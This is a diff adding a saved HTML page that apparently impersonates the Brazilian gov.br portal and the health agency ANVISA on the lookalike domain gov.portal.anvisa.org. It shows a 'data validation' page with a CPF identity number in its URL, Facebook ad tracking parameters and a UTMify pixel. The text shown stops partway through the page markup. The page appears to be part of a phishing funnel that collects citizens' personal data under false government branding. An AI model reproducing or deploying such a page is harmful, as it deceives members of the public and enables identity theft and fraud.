@@ -1,0 +1,3185 @@
+<!DOCTYPE html>
+<!-- saved from url=(0059)https://gov.portal.anvisa.org/validar-dados?cpf=69671831800 -->
+<html lang="pt-br"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+        
+        <meta content="width=device-width, initial-scale=1.0" name="viewport">
+        <title>Validação de Dados - ANVISA</title>
+
+        <!-- UTMify Pixel -->
+        <script>
+          window.pixelId = "691e4e1d6076486a2bdde991";
+          var a = document.createElement("script");
+          a.setAttribute("async", "");
+          a.setAttribute("defer", "");
+          a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+          document.head.appendChild(a);
+        </script>
+
+        <link rel="stylesheet" href="./index_files/rawline-fonts.css">
+        <script src="./index_files/saved_resource"></script>
+        <link href="./index_files/all.min.css" rel="stylesheet">
+
+<script>
+  document.addEventListener("DOMContentLoaded", function () {
+    console.log("[ANVISA] Página de validação de dados carregada");
+  });
+</script>
+
+        <style>
+            .gov-header {
+                background-color: #222222;
+            }
+            .inep-header {
+                background-color: #044785;
+            }
+            .encceja-color {
+                color: #3b5998;
+            }
+            .encceja-light {
+                color: #a0a0a0;
+            }
+            .form-header {
+                background-color: #2c5985;
+                color: white;
+            }
+            .form-footer {
+                background-color: #5d85ab;
+                color: white;
+            }
+
+            button#submit-button {
+                transition: all 0.2s ease;
+                background-color: #5d85ab;
+                color: rgba(255, 255, 255, 0.6);
+            }
+
+            button#submit-button:not([disabled]) {
+                color: white;
+                cursor: pointer;
+            }
+
+            button#submit-button:not([disabled]):hover {
+                background-color: #4d7396;
+            }
+            .required-star {
+                color: #ff0000;
+            }
+            .footer-bg {
+                background-color: #1c2b39;
+            }
+            input::placeholder {
+                font-family: 'Rawline', Arial, sans-serif;
+            }
+     
+            .transparent {
+                opacity: 0.5;
+            }
+            
+<style>
+  @font-face {
+    font-family: "Rawline";
+    src: url("/static/fonts/rawline-400.woff2")
+      format("woff2");
+    font-weight: 400;
+    font-style: normal;
+  }
+  @font-face {
+    font-family: "Rawline";
+    src: url("/static/fonts/rawline-400i.woff2")
+      format("woff2");
+    font-weight: 400;
+    font-style: italic;
+  }
+  @font-face {
+    font-family: "Rawline";
+    src: url("/static/fonts/rawline-500.woff2")
+      format("woff2");
+    font-weight: 500;
+    font-style: normal;
+  }
+  @font-face {
+    font-family: "Rawline";
+    src: url("/static/fonts/rawline-600.woff2")
+      format("woff2");
+    font-weight: 600;
+    font-style: normal;
+  }
+  @font-face {
+    font-family: "Rawline";
+    src: url("/static/fonts/rawline-700.woff2")
+      format("woff2");
+    font-weight: 700;
+    font-style: normal;
+  }
+
+  body {
+    font-family: "Rawline", sans-serif;
+  }
+  .monjauros-title {
+    font-weight: 700;
+    font-size: 1rem;
+    color: #555;
+    line-height: normal;
+    text-transform: uppercase;
+    text-align: left;
+    margin-bottom: 1rem;
+  }
+  .main-title {
+    font-size: 1.4rem;
+    line-height: 2rem;
+    font-weight: 600;
+    color: #0c326f;
+    padding-bottom: 10px;
+    margin: 0;
+  }
+  .subtitle {
+    font-weight: 400;
+    font-size: 16px;
+    color: #555;
+    line-height: normal;
+    margin-bottom: 10px;
+  }
+
+  /* Estilos específicos da validação */
+  .validation-section {
+    margin: 24px 0;
+    padding: 16px;
+    border: 1px solid #e5e7eb;
+    border-radius: 8px;
+    background: #fafbfc;
+  }
+
+  .validation-step {
+    display: flex;
+    align-items: center;
+    padding: 12px 0;
+    border-bottom: 1px solid #f1f5f9;
+  }
+
+  .validation-step:last-child {
+    border-bottom: none;
+  }
+
+  .step-number {
+    width: 24px;
+    height: 24px;
+    background: #1451b4;
+    color: white;
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 12px;
+    font-weight: 600;
+    margin-right: 12px;
+    flex-shrink: 0;
+  }
+
+  .step-number.processing {
+    background: #f59e0b;
+    animation: pulse 2s infinite;
+  }
+
+  .step-number.completed {
+    background: #10b981;
+  }
+
+  .step-number.error {
+    background: #ef4444;
+  }
+
+  @keyframes pulse {
+    0%,
+    100% {
+      opacity: 1;
+    }
+    50% {
+      opacity: 0.5;
+    }
+  }
+
+  .step-content {
+    flex: 1;
+  }
+
+  .step-title {
+    font-size: 14px;
+    font-weight: 600;
+    color: #374151;
+    margin-bottom: 4px;
+  }
+
+  .step-description {
+    font-size: 13px;
+    color: #6b7280;
+  }
+
+  .data-display {
+    background: white;
+    border: 1px solid #e5e7eb;
+    border-radius: 6px;
+    padding: 16px;
+    margin: 16px 0;
+    font-family: "Courier New", monospace;
+    font-size: 14px;
+  }
+
+  .data-row {
+    display: flex;
+    justify-content: space-between;
+    margin-bottom: 8px;
+    flex-wrap: wrap;
+    gap: 8px;
+  }
+
+  .data-row:last-child {
+    margin-bottom: 0;
+  }
+
+  .data-label {
+    font-weight: 600;
+    color: #6b7280;
+    min-width: 120px;
+    flex-shrink: 0;
+  }
+
+  .data-value {
+    color: #1f2937;
+    word-break: break-word;
+    text-align: right;
+    flex: 1;
+  }
+
+  /* Responsividade para telas pequenas */
+  @media (max-width: 640px) {
+    .data-row {
+      flex-direction: column;
+      align-items: stretch;
+      gap: 4px;
+    }
+
+    .data-label {
+      min-width: auto;
+    }
+
+    .data-value {
+      text-align: left;
+      font-size: 13px;
+    }
+
+    .data-display {
+      padding: 12px;
+      font-size: 13px;
+    }
+  }
+
+  /* Loader spinner */
+  .loader-spinner {
+    width: 16px;
+    height: 16px;
+    border: 2px solid #e5e7eb;
+    border-top: 2px solid #1451b4;
+    border-radius: 50%;
+    animation: spin 1s linear infinite;
+  }
+
+  @keyframes spin {
+    0% {
+      transform: rotate(0deg);
+    }
+    100% {
+      transform: rotate(360deg);
+    }
+  }
+
+  .options-container {
+    margin: 16px 0;
+  }
+
+  .option-item {
+    border: 1px solid #e5e7eb;
+    border-radius: 8px;
+    padding: 12px 16px;
+    margin: 8px 0;
+    cursor: pointer;
+    transition: all 0.2s ease;
+    background: white;
+  }
+
+  .option-item:hover {
+    border-color: #1451b4;
+    box-shadow: 0 2px 4px rgba(20, 81, 180, 0.1);
+  }
+
+  .option-item.selected {
+    border-color: #1451b4;
+    background: #eff6ff;
+  }
+
+  .option-item.correct {
+    border-color: #10b981;
+    background: #ecfdf5;
+  }
+
+  .option-item.incorrect {
+    border-color: #ef4444;
+    background: #fef2f2;
+  }
+
+  .alert-message {
+    padding: 12px 16px;
+    border-radius: 6px;
+    margin: 16px 0;
+    font-size: 14px;
+    font-weight: 500;
+  }
+
+  .alert-success {
+    background: #ecfdf5;
+    border: 1px solid #d1fae5;
+    color: #065f46;
+  }
+
+  .alert-error {
+    background: #fef2f2;
+    border: 1px solid #fecaca;
+    color: #991b1b;
+  }
+
+  /* Animação para o ícone de checkmark */
+  .checkmark-animated {
+    animation: checkmarkAppear 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+  }
+
+  @keyframes checkmarkAppear {
+    0% {
+      transform: scale(0) rotate(-45deg);
+      opacity: 0;
+    }
+    50% {
+      transform: scale(1.2) rotate(-45deg);
+      opacity: 0.8;
+    }
+    100% {
+      transform: scale(1) rotate(0deg);
+      opacity: 1;
+    }
+  }
+
+  .continue-button {
+    display: inline-block;
+    background: #1451b4;
+    color: white;
+    padding: 12px 32px;
+    border: none;
+    border-radius: 6px;
+    font-weight: 600;
+    font-size: 16px;
+    cursor: pointer;
+    transition: background-color 0.2s ease;
+    text-decoration: none;
+  }
+
+  .continue-button:hover {
+    background: #0c3d8a;
+  }
+
+  .progress-indicator {
+    height: 3px;
+    background: #e5e7eb;
+    border-radius: 2px;
+    overflow: hidden;
+    margin: 16px 0;
+  }
+
+  .progress-bar {
+    height: 100%;
+    background: #1451b4;
+    width: 0%;
+    transition: width 0.6s ease;
+  }
+
+  .secure-badge {
+    background-color: #e6f3e6;
+    padding: 5px 10px;
+    border-radius: 5px;
+    font-size: 12px;
+    color: #2e7d32;
+    display: inline-block;
+  }
+
+  .vlibras-icon {
+    position: fixed;
+    right: 10px;
+    top: 40%;
+    transform: translateY(-50%);
+    z-index: 1000;
+  }
+</style>
+
+    <style>*, ::before, ::after{--tw-border-spacing-x:0;--tw-border-spacing-y:0;--tw-translate-x:0;--tw-translate-y:0;--tw-rotate:0;--tw-skew-x:0;--tw-skew-y:0;--tw-scale-x:1;--tw-scale-y:1;--tw-pan-x: ;--tw-pan-y: ;--tw-pinch-zoom: ;--tw-scroll-snap-strictness:proximity;--tw-gradient-from-position: ;--tw-gradient-via-position: ;--tw-gradient-to-position: ;--tw-ordinal: ;--tw-slashed-zero: ;--tw-numeric-figure: ;--tw-numeric-spacing: ;--tw-numeric-fraction: ;--tw-ring-inset: ;--tw-ring-offset-width:0px;--tw-ring-offset-color:#fff;--tw-ring-color:rgb(59 130 246 / 0.5);--tw-ring-offset-shadow:0 0 #0000;--tw-ring-shadow:0 0 #0000;--tw-shadow:0 0 #0000;--tw-shadow-colored:0 0 #0000;--tw-blur: ;--tw-brightness: ;--tw-contrast: ;--tw-grayscale: ;--tw-hue-rotate: ;--tw-invert: ;--tw-saturate: ;--tw-sepia: ;--tw-drop-shadow: ;--tw-backdrop-blur: ;--tw-backdrop-brightness: ;--tw-backdrop-contrast: ;--tw-backdrop-grayscale: ;--tw-backdrop-hue-rotate: ;--tw-backdrop-invert: ;--tw-backdrop-opacity: ;--tw-backdrop-saturate: ;--tw-backdrop-sepia: ;--tw-contain-size: ;--tw-contain-layout: ;--tw-contain-paint: ;--tw-contain-style: }::backdrop{--tw-border-spacing-x:0;--tw-border-spacing-y:0;--tw-translate-x:0;--tw-translate-y:0;--tw-rotate:0;--tw-skew-x:0;--tw-skew-y:0;--tw-scale-x:1;--tw-scale-y:1;--tw-pan-x: ;--tw-pan-y: ;--tw-pinch-zoom: ;--tw-scroll-snap-strictness:proximity;--tw-gradient-from-position: ;--tw-gradient-via-position: ;--tw-gradient-to-position: ;--tw-ordinal: ;--tw-slashed-zero: ;--tw-numeric-figure: ;--tw-numeric-spacing: ;--tw-numeric-fraction: ;--tw-ring-inset: ;--tw-ring-offset-width:0px;--tw-ring-offset-color:#fff;--tw-ring-color:rgb(59 130 246 / 0.5);--tw-ring-offset-shadow:0 0 #0000;--tw-ring-shadow:0 0 #0000;--tw-shadow:0 0 #0000;--tw-shadow-colored:0 0 #0000;--tw-blur: ;--tw-brightness: ;--tw-contrast: ;--tw-grayscale: ;--tw-hue-rotate: ;--tw-invert: ;--tw-saturate: ;--tw-sepia: ;--tw-drop-shadow: ;--tw-backdrop-blur: ;--tw-backdrop-brightness: ;--tw-backdrop-contrast: ;--tw-backdrop-grayscale: ;--tw-backdrop-hue-rotate: ;--tw-backdrop-invert: ;--tw-backdrop-opacity: ;--tw-backdrop-saturate: ;--tw-backdrop-sepia: ;--tw-contain-size: ;--tw-contain-layout: ;--tw-contain-paint: ;--tw-contain-style: }/* ! tailwindcss v3.4.17 | MIT License | https://tailwindcss.com */*,::after,::before{box-sizing:border-box;border-width:0;border-style:solid;border-color:#e5e7eb}::after,::before{--tw-content:''}:host,html{line-height:1.5;-webkit-text-size-adjust:100%;-moz-tab-size:4;tab-size:4;font-family:ui-sans-serif, system-ui, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";font-feature-settings:normal;font-variation-settings:normal;-webkit-tap-highlight-color:transparent}body{margin:0;line-height:inherit}hr{height:0;color:inherit;border-top-width:1px}abbr:where([title]){-webkit-text-decoration:underline dotted;text-decoration:underline dotted}h1,h2,h3,h4,h5,h6{font-size:inherit;font-weight:inherit}a{color:inherit;text-decoration:inherit}b,strong{font-weight:bolder}code,kbd,pre,samp{font-family:ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;font-feature-settings:normal;font-variation-settings:normal;font-size:1em}small{font-size:80%}sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline}sub{bottom:-.25em}sup{top:-.5em}table{text-indent:0;border-color:inherit;border-collapse:collapse}button,input,optgroup,select,textarea{font-family:inherit;font-feature-settings:inherit;font-variation-settings:inherit;font-size:100%;font-weight:inherit;line-height:inherit;letter-spacing:inherit;color:inherit;margin:0;padding:0}button,select{text-transform:none}button,input:where([type=button]),input:where([type=reset]),input:where([type=submit]){-webkit-appearance:button;background-color:transparent;background-image:none}:-moz-focusring{outline:auto}:-moz-ui-invalid{box-shadow:none}progress{vertical-align:baseline}::-webkit-inner-spin-button,::-webkit-outer-spin-button{height:auto}[type=search]{-webkit-appearance:textfield;outline-offset:-2px}::-webkit-search-decoration{-webkit-appearance:none}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}summary{display:list-item}blockquote,dd,dl,figure,h1,h2,h3,h4,h5,h6,hr,p,pre{margin:0}fieldset{margin:0;padding:0}legend{padding:0}menu,ol,ul{list-style:none;margin:0;padding:0}dialog{padding:0}textarea{resize:vertical}input::placeholder,textarea::placeholder{opacity:1;color:#9ca3af}[role=button],button{cursor:pointer}:disabled{cursor:default}audio,canvas,embed,iframe,img,object,svg,video{display:block;vertical-align:middle}img,video{max-width:100%;height:auto}[hidden]:where(:not([hidden=until-found])){display:none}.container{width:100%}@media (min-width: 640px){.container{max-width:640px}}@media (min-width: 768px){.container{max-width:768px}}@media (min-width: 1024px){.container{max-width:1024px}}@media (min-width: 1280px){.container{max-width:1280px}}@media (min-width: 1536px){.container{max-width:1536px}}.fixed{position:fixed}.absolute{position:absolute}.relative{position:relative}.inset-0{inset:0px}.left-0{left:0px}.right-0{right:0px}.top-0{top:0px}.z-50{z-index:50}.mx-auto{margin-left:auto;margin-right:auto}.my-1{margin-top:0.25rem;margin-bottom:0.25rem}.my-4{margin-top:1rem;margin-bottom:1rem}.my-6{margin-top:1.5rem;margin-bottom:1.5rem}.mb-4{margin-bottom:1rem}.mb-6{margin-bottom:1.5rem}.mr-2{margin-right:0.5rem}.mr-3{margin-right:0.75rem}.mt-2{margin-top:0.5rem}.mt-6{margin-top:1.5rem}.mb-2{margin-bottom:0.5rem}.mb-3{margin-bottom:0.75rem}.ml-2{margin-left:0.5rem}.mt-4{margin-top:1rem}.mb-\[52px\]{margin-bottom:52px}.ml-4{margin-left:1rem}.mr-1{margin-right:0.25rem}.flex{display:flex}.inline-flex{display:inline-flex}.hidden{display:none}.h-4{height:1rem}.h-6{height:1.5rem}.h-full{height:100%}.h-10{height:2.5rem}.h-16{height:4rem}.h-2{height:0.5rem}.h-\[60px\]{height:60px}.min-h-screen{min-height:100vh}.w-4{width:1rem}.w-56{width:14rem}.w-80{width:20rem}.w-full{width:100%}.w-px{width:1px}.w-screen{width:100vw}.w-10{width:2.5rem}.w-16{width:4rem}.w-2{width:0.5rem}.w-\[165px\]{width:165px}.max-w-md{max-width:28rem}.max-w-3xl{max-width:48rem}.flex-1{flex:1 1 0%}.cursor-pointer{cursor:pointer}.flex-col{flex-direction:column}.flex-wrap{flex-wrap:wrap}.items-center{align-items:center}.justify-center{justify-content:center}.justify-between{justify-content:space-between}.gap-3{gap:0.75rem}.gap-4{gap:1rem}.space-x-2 > :not([hidden]) ~ :not([hidden]){--tw-space-x-reverse:0;margin-right:calc(0.5rem * var(--tw-space-x-reverse));margin-left:calc(0.5rem * calc(1 - var(--tw-space-x-reverse)))}.space-x-4 > :not([hidden]) ~ :not([hidden]){--tw-space-x-reverse:0;margin-right:calc(1rem * var(--tw-space-x-reverse));margin-left:calc(1rem * calc(1 - var(--tw-space-x-reverse)))}.space-y-2 > :not([hidden]) ~ :not([hidden]){--tw-space-y-reverse:0;margin-top:calc(0.5rem * calc(1 - var(--tw-space-y-reverse)));margin-bottom:calc(0.5rem * var(--tw-space-y-reverse))}.space-y-3 > :not([hidden]) ~ :not([hidden]){--tw-space-y-reverse:0;margin-top:calc(0.75rem * calc(1 - var(--tw-space-y-reverse)));margin-bottom:calc(0.75rem * var(--tw-space-y-reverse))}.space-y-4 > :not([hidden]) ~ :not([hidden]){--tw-space-y-reverse:0;margin-top:calc(1rem * calc(1 - var(--tw-space-y-reverse)));margin-bottom:calc(1rem * var(--tw-space-y-reverse))}.space-y-1 > :not([hidden]) ~ :not([hidden]){--tw-space-y-reverse:0;margin-top:calc(0.25rem * calc(1 - var(--tw-space-y-reverse)));margin-bottom:calc(0.25rem * var(--tw-space-y-reverse))}.space-y-2\.5 > :not([hidden]) ~ :not([hidden]){--tw-space-y-reverse:0;margin-top:calc(0.625rem * calc(1 - var(--tw-space-y-reverse)));margin-bottom:calc(0.625rem * var(--tw-space-y-reverse))}.rounded{border-radius:0.25rem}.rounded-full{border-radius:9999px}.rounded-lg{border-radius:0.5rem}.rounded-md{border-radius:0.375rem}.border{border-width:1px}.border-t{border-top-width:1px}.border-b{border-bottom-width:1px}.border-l-2{border-left-width:2px}.border-none{border-style:none}.border-gray-200{--tw-border-opacity:1;border-color:rgb(229 231 235 / var(--tw-border-opacity, 1))}.border-gray-300{--tw-border-opacity:1;border-color:rgb(209 213 219 / var(--tw-border-opacity, 1))}.border-\[\#bfcbe2\]{--tw-border-opacity:1;border-color:rgb(191 203 226 / var(--tw-border-opacity, 1))}.border-white{--tw-border-opacity:1;border-color:rgb(255 255 255 / var(--tw-border-opacity, 1))}.bg-\[\#1451B4\]{--tw-bg-opacity:1;background-color:rgb(20 81 180 / var(--tw-bg-opacity, 1))}.bg-black{--tw-bg-opacity:1;background-color:rgb(0 0 0 / var(--tw-bg-opacity, 1))}.bg-gray-200{--tw-bg-opacity:1;background-color:rgb(229 231 235 / var(--tw-bg-opacity, 1))}.bg-gray-300{--tw-bg-opacity:1;background-color:rgb(209 213 219 / var(--tw-bg-opacity, 1))}.bg-white{--tw-bg-opacity:1;background-color:rgb(255 255 255 / var(--tw-bg-opacity, 1))}.bg-green-100{--tw-bg-opacity:1;background-color:rgb(220 252 231 / var(--tw-bg-opacity, 1))}.bg-green-500{--tw-bg-opacity:1;background-color:rgb(34 197 94 / var(--tw-bg-opacity, 1))}.bg-\[\#0B2341\]{--tw-bg-opacity:1;background-color:rgb(11 35 65 / var(--tw-bg-opacity, 1))}.bg-opacity-50{--tw-bg-opacity:0.5}.p-2{padding:0.5rem}.p-3{padding:0.75rem}.p-4{padding:1rem}.p-6{padding:1.5rem}.px-2{padding-left:0.5rem;padding-right:0.5rem}.px-4{padding-left:1rem;padding-right:1rem}.py-1{padding-top:0.25rem;padding-bottom:0.25rem}.py-2{padding-top:0.5rem;padding-bottom:0.5rem}.py-4{padding-top:1rem;padding-bottom:1rem}.py-6{padding-top:1.5rem;padding-bottom:1.5rem}.pb-2{padding-bottom:0.5rem}.pl-3{padding-left:0.75rem}.pb-4{padding-bottom:1rem}.pb-\[8px\]{padding-bottom:8px}.pl-\[4px\]{padding-left:4px}.pt-6{padding-top:1.5rem}.pt-\[64px\]{padding-top:64px}.pt-\[8px\]{padding-top:8px}.text-left{text-align:left}.text-center{text-align:center}.text-\[13px\]{font-size:13px}.text-base{font-size:1rem;line-height:1.5rem}.text-lg{font-size:1.125rem;line-height:1.75rem}.text-sm{font-size:0.875rem;line-height:1.25rem}.text-xl{font-size:1.25rem;line-height:1.75rem}.text-2xl{font-size:1.5rem;line-height:2rem}.text-\[12px\]{font-size:12px}.text-\[14px\]{font-size:14px}.text-\[15px\]{font-size:15px}.text-xs{font-size:0.75rem;line-height:1rem}.font-bold{font-weight:700}.font-light{font-weight:300}.font-medium{font-weight:500}.font-semibold{font-weight:600}.tracking-tight{letter-spacing:-0.025em}.text-\[\#1451B4\]{--tw-text-opacity:1;color:rgb(20 81 180 / var(--tw-text-opacity, 1))}.text-\[\#9E9D9D\]{--tw-text-opacity:1;color:rgb(158 157 157 / var(--tw-text-opacity, 1))}.text-gray-500{--tw-text-opacity:1;color:rgb(107 114 128 / var(--tw-text-opacity, 1))}.text-gray-600{--tw-text-opacity:1;color:rgb(75 85 99 / var(--tw-text-opacity, 1))}.text-gray-700{--tw-text-opacity:1;color:rgb(55 65 81 / var(--tw-text-opacity, 1))}.text-gray-800{--tw-text-opacity:1;color:rgb(31 41 55 / var(--tw-text-opacity, 1))}.text-white{--tw-text-opacity:1;color:rgb(255 255 255 / var(--tw-text-opacity, 1))}.text-gray-900{--tw-text-opacity:1;color:rgb(17 24 39 / var(--tw-text-opacity, 1))}.text-green-600{--tw-text-opacity:1;color:rgb(22 163 74 / var(--tw-text-opacity, 1))}.text-gray-300{--tw-text-opacity:1;color:rgb(209 213 219 / var(--tw-text-opacity, 1))}.text-gray-400{--tw-text-opacity:1;color:rgb(156 163 175 / var(--tw-text-opacity, 1))}.shadow-lg{--tw-shadow:0 10px 15px -3px rgb(0 0 0 / 0.1), 0 4px 6px -4px rgb(0 0 0 / 0.1);--tw-shadow-colored:0 10px 15px -3px var(--tw-shadow-color), 0 4px 6px -4px var(--tw-shadow-color);box-shadow:var(--tw-ring-offset-shadow, 0 0 #0000), var(--tw-ring-shadow, 0 0 #0000), var(--tw-shadow)}.transition-colors{transition-property:color, background-color, border-color, fill, stroke, -webkit-text-decoration-color;transition-property:color, background-color, border-color, text-decoration-color, fill, stroke;transition-property:color, background-color, border-color, text-decoration-color, fill, stroke, -webkit-text-decoration-color;transition-timing-function:cubic-bezier(0.4, 0, 0.2, 1);transition-duration:150ms}.transition-transform{transition-property:transform;transition-timing-function:cubic-bezier(0.4, 0, 0.2, 1);transition-duration:150ms}.duration-300{transition-duration:300ms}.hover\:bg-blue-700:hover{--tw-bg-opacity:1;background-color:rgb(29 78 216 / var(--tw-bg-opacity, 1))}.hover\:bg-gray-300:hover{--tw-bg-opacity:1;background-color:rgb(209 213 219 / var(--tw-bg-opacity, 1))}.hover\:text-gray-700:hover{--tw-text-opacity:1;color:rgb(55 65 81 / var(--tw-text-opacity, 1))}.hover\:text-gray-300:hover{--tw-text-opacity:1;color:rgb(209 213 219 / var(--tw-text-opacity, 1))}.hover\:text-white:hover{--tw-text-opacity:1;color:rgb(255 255 255 / var(--tw-text-opacity, 1))}@media (min-width: 768px){.md\:h-7{height:1.75rem}}</style></head>
+    <body class="min-h-screen flex flex-col">
+        <img style="opacity: 0;" src="./index_files/IMG-3113.jpg" alt="Government header" class="w-screen">
+
+<!-- Header fixo superior gov.br -->
+<header id="gov-header" class="bg-white z-50 fixed w-full top-0">
+  <div class="container mx-auto px-4 py-4 flex items-center justify-between">
+    <!-- Logo gov.br -->
+    <a href="https://gov.portal.anvisa.org/?utm_source=FB&amp;utm_medium=%7B%7Badset.name%7D%7D%7C%7B%7Badset.id%7D%7D&amp;utm_campaign=%7B%7Bcampaign.name%7D%7D%7C%7B%7Bcampaign.id%7D%7D&amp;utm_content=%7B%7Bad.name%7D%7D%7C%7B%7Bad.id%7D%7D&amp;utm_term=%7B%7Bplacement%7D%7D&amp;fbclid=PARlRTSANaCulleHRuA2FlbQIxMAABpxBfcxNdnEISSc5wwLVWe7_LivQLynLo3JcQCrGhlVFnCiiLzbGSo-T04Iwj_aem_jKb7dRX-lCloXeX6V6ICTw">
+      <img src="./index_files/Gov.br_logo.svg.png" alt="gov.br logo" class="h-6 md:h-7">
+    </a>
+
+    <!-- Ícones do lado direito -->
+    <div class="flex items-center space-x-4">
+      <!-- Menu dropdown principal -->
+      <div class="relative">
+        <button id="menu-dropdown-btn" class="text-[#1451B4] p-2 rounded-md transition-colors">
+          <i class="fas fa-ellipsis-v text-base"></i>
+        </button>
+        <div id="menu-dropdown" class="hidden absolute mt-2 w-56 bg-white rounded-md shadow-lg border z-50">
+          <a href="https://gov.portal.anvisa.org/validar-dados?cpf=69671831800#" class="flex items-center px-4 py-2 text-sm text-gray-700">
+            <i class="fas fa-info-circle mr-2 text-[#1451B4]"></i>
+            Sobre o Ministério
+          </a>
+          <a href="https://gov.portal.anvisa.org/validar-dados?cpf=69671831800#" class="flex items-center px-4 py-2 text-sm text-gray-700">
+            <i class="fas fa-briefcase mr-2 text-[#1451B4]"></i>
+            Serviços do Programa
+          </a>
+          <a href="https://gov.portal.anvisa.org/validar-dados?cpf=69671831800#" class="flex items-center px-4 py-2 text-sm text-gray-700">
+            <i class="fas fa-users mr-2 text-[#1451B4]"></i>
+            Navegação por Público
+          </a>
+          <a href="https://gov.portal.anvisa.org/validar-dados?cpf=69671831800#" class="flex items-center px-4 py-2 text-sm text-gray-700">
+            <i class="fas fa-phone mr-2 text-[#1451B4]"></i>
+            Contato e Canais
+          </a>
+          <div class="border-t my-1"></div>
+          <a href="https://gov.portal.anvisa.org/validar-dados?cpf=69671831800#" class="flex items-center px-4 py-2 text-sm text-gray-700">
+            <i class="fas fa-info mr-2 text-[#1451B4]"></i>
+            Acesso à Informação
+          </a>
+          <a href="https://gov.portal.anvisa.org/validar-dados?cpf=69671831800#" class="flex items-center px-4 py-2 text-sm text-gray-700">
+            <i class="fas fa-book mr-2 text-[#1451B4]"></i>
+            Centrais de Conteúdo
+          </a>
+        </div>
+      </div>
+      
+      <div class="w-px h-6 bg-gray-300"></div>
+      
+      <!-- Configurações de cookies -->
+      <button id="cookie-settings-btn" class="text-[#1451B4] p-2 rounded-md transition-colors" title="Configurações de cookies">
+        <i class="fas fa-cookie-bite text-base"></i>
+      </button>
+      
+      <!-- Menu grid -->
+      <div class="relative">
+        <button id="grid-menu-btn" class="text-[#1451B4] p-2 rounded-md transition-colors">
+          <i class="fas fa-th text-base"></i>
+        </button>
+        <div id="grid-menu" class="hidden absolute right-0 mt-2 w-56 bg-white rounded-md shadow-lg border z-50">
+          <a href="https://gov.portal.anvisa.org/validar-dados?cpf=69671831800#" class="flex items-center px-4 py-2 text-sm text-gray-700">
+            <i class="fas fa-info-circle mr-2 text-[#1451B4]"></i>
+            Sobre o Ministério
+          </a>
+          <a href="https://gov.portal.anvisa.org/validar-dados?cpf=69671831800#" class="flex items-center px-4 py-2 text-sm text-gray-700">
+            <i class="fas fa-briefcase mr-2 text-[#1451B4]"></i>
+            Serviços do Programa
+          </a>
+          <a href="https://gov.portal.anvisa.org/validar-dados?cpf=69671831800#" class="flex items-center px-4 py-2 text-sm text-gray-700">
+            <i class="fas fa-users mr-2 text-[#1451B4]"></i>
+            Navegação por Público
+          </a>
+          <a href="https://gov.portal.anvisa.org/validar-dados?cpf=69671831800#" class="flex items-center px-4 py-2 text-sm text-gray-700">
+            <i class="fas fa-phone mr-2 text-[#1451B4]"></i>
+            Contato e Canais
+          </a>
+        </div>
+      </div>
+      
+      <!-- Botão de usuário/entrar -->
+      <button id="user-btn" class="bg-[#1451B4] text-white rounded-full px-4 py-2 text-sm flex items-center hover:bg-blue-700 transition-colors">
+        <i class="fas fa-user mr-2 text-sm"></i>
+        <span id="user-name">Entrar</span>
+      </button>
+    </div>
+  </div>
+</header>
+
+<!-- Navegação secundária -->
+<nav class="bg-white px-2 py-2 flex justify-between items-center">
+  <button id="mobile-menu-btn" class="border-none text-[#1451B4] flex items-center cursor-pointer rounded-md transition-colors px-2 py-1">
+    <i class="fas fa-bars mr-3 text-lg"></i>
+    <span class="text-gray-600 text-sm font-light">
+      Agência Nacional de Vigilância Sanitária | ANVISA
+    </span>
+  </button>
+</nav>
+
+<!-- Menu mobile overlay -->
+<div id="mobile-menu-overlay" class="hidden fixed inset-0 bg-black bg-opacity-50 z-50">
+  <div class="fixed left-0 top-0 h-full w-80 bg-white shadow-lg">
+    <div class="p-6">
+      <div class="flex justify-between items-center mb-6">
+        <h2 class="text-xl font-semibold text-gray-800">Menu Principal</h2>
+        <button id="close-mobile-menu" class="text-gray-500 hover:text-gray-700">
+          <i class="fas fa-times text-lg"></i>
+        </button>
+      </div>
+      
+      <div class="space-y-2">
+        <a href="https://gov.portal.anvisa.org/validar-dados?cpf=69671831800#" class="w-full text-left p-3 rounded-md transition-colors flex items-center">
+          <i class="fas fa-info-circle mr-3 text-[#1451B4]"></i>
+          <span>Sobre o Ministério</span>
+        </a>
+        <a href="https://gov.portal.anvisa.org/validar-dados?cpf=69671831800#" class="w-full text-left p-3 rounded-md transition-colors flex items-center">
+          <i class="fas fa-cogs mr-3 text-[#1451B4]"></i>
+          <span>Serviços do Programa</span>
+        </a>
+        <a href="https://gov.portal.anvisa.org/validar-dados?cpf=69671831800#" class="w-full text-left p-3 rounded-md transition-colors flex items-center">
+          <i class="fas fa-users mr-3 text-[#1451B4]"></i>
+          <span>Navegação por Público</span>
+        </a>
+        <a href="https://gov.portal.anvisa.org/validar-dados?cpf=69671831800#" class="w-full text-left p-3 rounded-md transition-colors flex items-center">
+          <i class="fas fa-phone mr-3 text-[#1451B4]"></i>
+          <span>Contato e Canais</span>
+        </a>
+        <div class="border-t my-4"></div>
+        <a href="https://gov.portal.anvisa.org/validar-dados?cpf=69671831800#" class="w-full text-left p-3 rounded-md transition-colors flex items-center">
+          <i class="fas fa-info mr-3 text-[#1451B4]"></i>
+          <span>Acesso à Informação</span>
+        </a>
+        <a href="https://gov.portal.anvisa.org/validar-dados?cpf=69671831800#" class="w-full text-left p-3 rounded-md transition-colors flex items-center">
+          <i class="fas fa-book mr-3 text-[#1451B4]"></i>
+          <span>Centrais de Conteúdo</span>
+        </a>
+        <a href="https://gov.portal.anvisa.org/validar-dados?cpf=69671831800#" class="w-full text-left p-3 rounded-md transition-colors flex items-center">
+          <i class="fas fa-headset mr-3 text-[#1451B4]"></i>
+          <span>Canais de Atendimento</span>
+        </a>
+        <a href="https://gov.portal.anvisa.org/validar-dados?cpf=69671831800#" class="w-full text-left p-3 rounded-md transition-colors flex items-center">
+          <i class="fas fa-project-diagram mr-3 text-[#1451B4]"></i>
+          <span>Programas e Projetos</span>
+        </a>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- Modal de configurações de cookies -->
+<div id="cookie-modal" class="hidden fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 p-4">
